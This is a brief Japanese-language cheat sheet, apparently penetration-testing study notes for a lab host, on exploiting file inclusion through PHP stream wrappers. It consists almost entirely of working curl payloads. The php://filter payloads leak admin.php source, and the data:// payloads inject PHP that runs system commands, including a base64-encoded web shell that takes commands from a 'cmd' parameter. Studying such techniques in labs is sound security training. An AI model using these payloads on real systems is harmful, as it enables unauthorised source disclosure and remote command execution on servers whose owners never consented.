## PHPラッパー
### php://
```sh
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

# phpコードが実行されないようにbase64にエンコードして出力
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

```
### data://
```sh
curl http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php+echo+system('ls'); ?>

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
# PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```